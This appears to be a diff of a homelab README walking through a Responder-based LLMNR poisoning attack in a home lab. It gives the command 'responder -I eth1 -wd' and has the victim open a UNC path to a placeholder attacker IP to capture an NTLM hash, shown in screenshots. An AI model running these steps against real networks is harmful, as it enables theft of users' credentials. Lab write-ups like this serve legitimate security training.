@@ -17,11 +17,16 @@ the group policy editor, under the “policy setting” menu under<br /> Local C
  
  - Attack
 1. </b>Identify the name of your NIC (usually eth0) by typing ifconfig. For me it was eth1
-     ![image](https://github.com/AlexanderStroer/Cybersecurity-Homelab/assets/122342684/851ba128-52e2-4a1c-bc58-475fdd58ea28)
+![image](https://github.com/AlexanderStroer/Cybersecurity-Homelab/assets/122342684/851ba128-52e2-4a1c-bc58-475fdd58ea28)<br />
 1. Run Responder with the command <i> responder -I eth1 -wd </i>(ignorantly put, this will act almost like a DNS except it will wait the source to fail to resolve a destination upon which responder will falsely claim that it has that information and receive the traffic illegitimately)
-![image](https://github.com/AlexanderStroer/Cybersecurity-Homelab/assets/122342684/d8ee2913-92dc-4fde-83da-23b5d970338b)
+![image](https://github.com/AlexanderStroer/Cybersecurity-Homelab/assets/122342684/d8ee2913-92dc-4fde-83da-23b5d970338b)<br />
+1. Now you'll need to wait for a user to make a mistake; alternatively I can feed that mistake by taking the network path straight to the attacker. Open up file explorer and type \\ATTACK_MACHINES_IP_HERE<br /> <br />You'll see something like this appear on the victims side.<br />
+![image](https://github.com/AlexanderStroer/Cybersecurity-Homelab/assets/122342684/8626effd-5e38-4573-bd08-9c67e9290afe)<br />
+<br />And something like this on the attackers side. (I covered up some of the hash with that big box)<br />
+![image](https://github.com/AlexanderStroer/Cybersecurity-Homelab/assets/122342684/611d9680-bafa-48fd-88d0-941d3a86b6d2)
 
 
+<br />
 <b>
 You’ll need to install impacket for kali linux, you can find it here: <br />
 [Impacket](https://github.com/fortra/impacket)
